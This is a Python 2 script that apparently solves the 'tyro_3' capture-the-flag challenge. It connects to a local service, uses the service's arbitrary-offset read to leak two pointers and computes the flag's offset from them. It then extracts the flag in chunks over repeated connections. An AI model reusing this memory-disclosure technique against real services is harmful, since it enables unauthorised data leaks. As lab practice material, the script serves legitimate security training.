#!/usr/bin/python

import socket
import sys
import time


def getLine(s):
    # Gets a \n delimited line from socket s
    done = False
    line = ""
    while not done:
        data = s.recv(1)
        if data == "\n":
            done = True
        else:
            line += data
	# test for prompt
        if ": " in line:
            done = True
    print "[-] Got Line: {}".format(line)
    return line

def pullText(hexVal):
    # takes a 0xXXXXXXXX and returns a text fragment, as well as "True" in finished
    # if a null byte was found.
    # remove the "0x"
    hexVal = hexVal[2:]
    # test length.  If not even, add leadign zeros
    if (len(hexVal) % 2):
        hexVal = "0"*(8-len(hexVal))+hexVal
    # Begin to reduce
    text = ""
    # Remember, the multibyte value was given in LE
    for i in range(0, len(hexVal), 2):
        thisByte = hexVal[i:i+2]
        #print "[d] thisByte: {}".format(thisByte)
        intByte = int(thisByte, 16)
        #print "[d] intByte: {}".format(intByte)
        if intByte == 0:
            return True, text
        text = chr(intByte) + text

    return False, text
    
def getAddressByBytes(initOffset, s, needprompt = True):
    val = ""
    for i in range(4):
        offset = initOffset + i
        tosend = hex(offset)[2:]
        if (needprompt):
            # Then we need to get the prompt
            getLine(s)
        needprompt = True
        # send the offset we want
        send(tosend, s)
        # get the response
        retval = getLine(s)
        retval = retval[2:]
        # add leading 0?
        if (len(retval) % 2):
            retval = "0" + retval
        val = retval + val
        #time.sleep(1)
    val = "0x"+val
    print "[-] Got addressByBtes: {}".format(val)
    return val
        
def send(text, s):
    # fix a hex send
    if (("0x" in text) and ("L" in text)):
        text = text[:-1]
    tosend = "{}".format(text)
    print "[-] Sending: {}".format(tosend)
    tosend += '\r\n'
    s.send(tosend)
    return


flagfound = False
fullflag = ""

while not flagfound:
    print "[-] Contacting tyro_3 server.."
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('localhost', 31337))
    print "[-] Working through banners.."
    done = False
    while not done:
        line = getLine(s)
        if "Offset" in line:
            done = True

    print "[-] Getting first offset"
    offset1 = getAddressByBytes(0, s, False)
    print "[+] First offset is: {}!".format(offset1)


    print "[-] Getting second offset"
    offset2 = getAddressByBytes(8, s)
    print "[+] Second offset is: {}!".format(offset2)

    # Calc the offset
    # turn to numbers
    offset1_int = int(offset1, 16)
    offset2_int = int(offset2, 16)

    flag_offset = offset2_int - offset1_int

    print "[-] Flag offset = {}".format(flag_offset)

    # get up to 8 letters from flag..  Done on 0x00 byte found
    flagpart = ""

    for i in range(8):
        offsettoget = flag_offset+len(fullflag)+len(flagpart)
        # Get the prompt
        skip = getLine(s)
        send(hex(offsettoget), s)
        #get the response
        flagbyte = getLine(s)
        if (int(flagbyte, 16)):
            flagpart += chr(int(flagbyte, 16))
        else:
            flagfound = True
            i = 9

    print "[-] Partial flag: {}".format(flagpart)
    fullflag += flagpart

    #wait for permission to go again
    if not flagfound:
        raw_input("[u] Press ENTER to continue..")

    s.close()

print "[+] Flag: {}".format(fullflag)

print "[-] Done!"




